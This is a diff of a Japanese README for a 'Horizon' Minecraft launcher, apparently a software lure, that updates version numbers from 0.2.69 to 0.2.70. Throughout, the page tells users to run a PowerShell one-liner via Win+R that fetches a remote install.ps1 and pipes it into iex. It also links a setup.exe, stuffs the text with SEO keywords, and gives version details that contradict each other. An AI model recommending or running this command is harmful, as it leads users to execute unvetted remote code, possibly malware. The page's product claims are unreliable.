@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>最新アップデート:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70">0.2.70</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">すべての更新とパッチ</a>
 </p>
 
@@ -64,12 +64,12 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/価格-無料-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.70-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.70-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.70-blue"></a>
 </p>
 
-<p align="center"><em>更新 2026-11-16：ランチャー <strong>0.2.69</strong>、LGPL、Win+R、UAC。 <a href="https://horizonlauncher.net/ja/">horizonlauncher.net</a>.</em></p>
+<p align="center"><em>更新 2026-11-17：ランチャー <strong>0.2.70</strong>、LGPL、Win+R、UAC。 <a href="https://horizonlauncher.net/ja/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft Rust版をダウンロード](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/ja/)
 
@@ -145,10 +145,11 @@ Horizon は Mojang / Microsoft の製品では **ありません**。**horizonla
 
 Horizon は継続更新です。各バージョンは個別リリースと changelog 付き。現行セットアップはサイト、パッチ履歴はここ。
 
-**最新アップデート:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[すべての更新とパッチ](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 件 (0.2.0 → 0.2.69).
+**最新アップデート:** [0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) · **[すべての更新とパッチ](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 件 (0.2.0 → 0.2.70).
 
 | バージョン | 日付 | |
 |---|---|---|
+| **[0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70)** | 2026-11-17 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) |
 | **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
 | **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
 | **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
@@ -164,10 +165,9 @@ Horizon は継続更新です。各バージョンは個別リリースと chang
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
 | **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
-| **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [ノート](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
 
 
-以前のバージョン: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
+以前のバージョン: [0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) · [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)
 
 
 ## Horizon Minecraft とは
@@ -190,7 +190,7 @@ Horizon は継続更新です。各バージョンは個別リリースと chang
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.69**
+- Horizon **0.2.70**
 - 無料 · サイトはロシア語と英語
 
 ## Horizon の入れ方 — 2つの方法
@@ -223,7 +223,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 同じ Horizon インストーラー — コマンドなしのファイルダウンロード。現行 **0.2.54**、Windows x64、約 60 MB。
 
 **[Horizon をダウンロード — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.70
 
 1. [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) をダウンロード。
 2. Windows インストーラーを実行。
@@ -287,7 +287,7 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 
 ### よくある検索
 
-`Horizon ダウンロード` · `Horizon ランチャー Windows` · `Horizon 0.2.69` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+`Horizon ダウンロード` · `Horizon ランチャー Windows` · `Horizon 0.2.70` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## FAQ
 
@@ -304,13 +304,13 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 Horizon の Rust クライアントには不要です。
 
 **ライセンスは？**  
-**0.2.69** 以降、Horizon 上流は **LGPL-3.0-or-later**。[https://horizonlauncher.net/ja/legal/](https://horizonlauncher.net/ja/legal/)
+**0.2.70** 以降、Horizon 上流は **LGPL-3.0-or-later**。[https://horizonlauncher.net/ja/legal/](https://horizonlauncher.net/ja/legal/)
 
 **Distant Horizons、Create、シェーダー？**  
 対応 — ネイティブ Mod (.hnmod)。[https://horizonlauncher.net/ja/distant-horizons/](https://horizonlauncher.net/ja/distant-horizons/) · [Create](https://horizonlauncher.net/ja/create-mod/) · [シェーダー](https://horizonlauncher.net/ja/shaders/)
 
-**チェンジログ 0.2.65–0.2.69？**  
-[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · ランチャー **0.2.69** [https://horizonlauncher.net/ja/](https://horizonlauncher.net/ja/)
+**チェンジログ 0.2.65–0.2.70？**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · ランチャー **0.2.70** [https://horizonlauncher.net/ja/](https://horizonlauncher.net/ja/)
 
 **Windows 7 / macOS / Linux？**  
 **Windows 10/11 x64** のみ対応。[https://horizonlauncher.net/ja/download-horizon/](https://horizonlauncher.net/ja/download-horizon/)。
@@ -334,12 +334,12 @@ Horizon の Rust クライアントには不要です。
 
 ## English — Horizon Minecraft ランチャーをダウンロード
 
-**Horizon** は無料の **Windows 向け Minecraft ランチャー** と **Rust 製 Java クライアント**（Minecraft Rust Edition）です。英語の公式ページ：[https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**。Mojang/Microsoft 公式ではありません。
+**Horizon** は無料の **Windows 向け Minecraft ランチャー** と **Rust 製 Java クライアント**（Minecraft Rust Edition）です。英語の公式ページ：[https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.70**。Mojang/Microsoft 公式ではありません。
 
 
 ## SEO タグと検索語
 
-`Horizon ダウンロード` `Horizon ランチャー` `Rust Minecraft` `Horizon 0.2.69` `horizonlauncher.net`
+`Horizon ダウンロード` `Horizon ランチャー` `Rust Minecraft` `Horizon 0.2.70` `horizonlauncher.net`
 
 `Horizon ダウンロード` `Horizon ランチャー` `Rust Minecraft` `Minecraft Rust Edition` `Minecraft FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon クイックインストール` `Horizon セットアップ` `Horizon ダウンロード` `Distant Horizons Horizon` `Create モッド`
 
